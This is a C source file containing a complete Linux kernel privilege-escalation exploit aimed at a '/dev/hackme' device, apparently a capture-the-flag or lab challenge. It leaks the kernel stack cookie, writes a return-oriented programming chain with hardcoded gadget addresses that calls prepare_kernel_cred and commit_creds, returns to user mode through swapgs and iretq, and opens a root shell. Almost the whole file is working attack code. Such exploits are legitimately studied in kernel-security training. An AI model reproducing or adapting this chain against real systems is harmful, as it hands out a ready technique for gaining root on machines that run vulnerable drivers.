#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>
#include <inttypes.h>
#include <stdlib.h>
#include <sys/stat.h>
#include <sys/types.h>

void open_dev(void);
int isCookie(unsigned long x);
void show_leaks(unsigned long *buf, int n);
void leak_cookie(void);
void write_ret(void);
void spawn_shell(void);
void save_state(void);

int devfd;
uint64_t cookie;
uint64_t user_cs, user_ss, user_rflags, user_sp;
uint64_t user_rip = (uint64_t) spawn_shell;

uint64_t prepare_kernel_cred = 0xffffffff814c67f0;
uint64_t commit_creds = 0xffffffff814c6410;

uint64_t pop_rdi_ret = 0xffffffff81006370;
// mov rdi, rax; mov qword ptr [rsi + 0x140], rdi; pop rbp
uint64_t mov_rdi_rax = 0xffffffff816bf203;
uint64_t swapgs_pop_rbp_ret = 0xffffffff8100a55f;
uint64_t iretq = 0xffffffff8100c0d9;

void open_dev(void) {
  devfd = open("/dev/hackme", O_RDWR);
  if(devfd < 0) {
    puts("[!] Failed to open device...");
    exit(-1);
  }
  puts("[*] Opened device");
}

int isCookie(unsigned long x) {
  if(((x&0xff) == 0x00) && \
    ((x&0xffff000000000000) != 0xffff000000000000) && \
    (x>>(8*7+4)) > 0x00) {
    return 1;
  }
  return 0;
}

void show_leaks(unsigned long *buf, int n) {
  for(int i = 0; i < n; ++i) {
    printf("[*] Leak[%02d]: %lx\n", i, buf[i]);
    if(isCookie(buf[i])) {
      printf("----\n[+] Cookie FOUND @ idx=%02d --> %lx\n----\n", i, buf[i]);
    }
  }
}

void leak_cookie(void) {
  unsigned n = 20;
  uint64_t leak[n];
  ssize_t r = read(devfd, leak, sizeof(leak));
  //show_leaks(leak, n);
  printf("[*] Leaked %zd bytes\n", r);
  cookie = leak[16];
  if(cookie == 0x00) {
    puts("[!] Failed to leak stack cookie");
    exit(-1);
  }
  printf("----\n[+] Cookie FOUND: %lx\n----\n", cookie);
}

void write_ret(void) {
  uint8_t sz = 35;
  uint64_t payload[sz];
  uint8_t off = 16;
  payload[off++] = cookie;
  payload[off++] = 0x00; // rbx
  payload[off++] = 0x00; // r12
  payload[off++] = 0x00; // rbp
  payload[off++] = pop_rdi_ret;
  payload[off++] = 0x0;
  payload[off++] = prepare_kernel_cred;
  payload[off++] = mov_rdi_rax;
  payload[off++] = 0x0; // for rbp pop of ^
  payload[off++] = commit_creds;
  payload[off++] = swapgs_pop_rbp_ret;
  payload[off++] = 0x0;
  payload[off++] = iretq;
  payload[off++] = user_rip; // rip
  payload[off++] = user_cs; // cs
  payload[off++] = user_rflags; // rflags
  payload[off++] = user_sp; // sp
  payload[off++] = user_ss; // ss

  ssize_t dat = write(devfd, payload, sizeof(payload));
  puts("----\n[!] Failed\n----");
}

void spawn_shell(void) {
  puts("[*] Hello from user land...");
  int uid = getuid();
  if(!uid) {
    printf("[+] UID: %d, got root!\n", uid);
    system("/bin/sh");
  }
  else {
    printf("[!] UID: %d, NO root :|\n", uid);
    exit(-1);
  }
}

void save_state(void) {
  __asm__(
    ".intel_syntax noprefix;"
    "mov user_cs, cs;"
    "mov user_ss, ss;"
    "mov user_sp, rsp;"
    "pushf;"
    "pop user_rflags;"
    ".att_syntax;"
  );
  puts("[+] Saved state");
}

int main(void) {
  puts("** Running Exploit **");
  open_dev();
  leak_cookie();
  save_state();
  write_ret();
  puts("----\n[!] Failed (main)\n----");
  return 0;
}
